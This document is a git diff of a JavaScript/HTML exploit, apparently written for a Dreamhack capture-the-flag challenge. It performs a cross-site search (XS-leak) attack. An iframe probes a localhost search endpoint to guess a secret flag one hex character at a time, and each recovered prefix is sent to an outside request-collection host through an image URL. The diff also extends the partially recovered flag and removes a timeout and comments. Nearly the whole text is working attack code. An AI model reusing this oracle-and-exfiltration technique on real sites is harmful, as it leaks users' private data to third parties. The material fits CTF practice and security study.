@@ -1,9 +1,11 @@
 <img id="img">
 <iframe id="iframe"></iframe>
+
 <script>
 async function search(query) {
     return new Promise((resolve) => {
         const iframe = document.getElementById("iframe");
+
         iframe.src = `http://localhost:8000/search?query=${query}`;
 
         iframe.onload = () => {
@@ -14,30 +16,25 @@ async function search(query) {
                 resolve(false);
             }
         };
-
-        // 필요시 타임아웃 처리
-        setTimeout(() => {
-            resolve(false);
-        }, 2000);
     });
 }
 
 async function exploit() {
     let chars = "0123456789abcdef}";
-    let secret = "DH{22d1445ad68e19";
+    let secret = "DH{22d1445ad68e194e044a16";
+    
     const img = document.getElementById("img");
 
-    // while 루프를 비동기로 처리
     while (!secret.includes("}")) {
         let found = false;
 
-        // 0-f를 순차로 시도
         for (let c of chars) {
             let success = await search(secret + c);
+
             if (success) {
                 secret += c;
-                found = true;
                 img.src = `https://rxoulox.request.dreamhack.games/${secret}`;
+                found = true;
                 break;
             }
         }
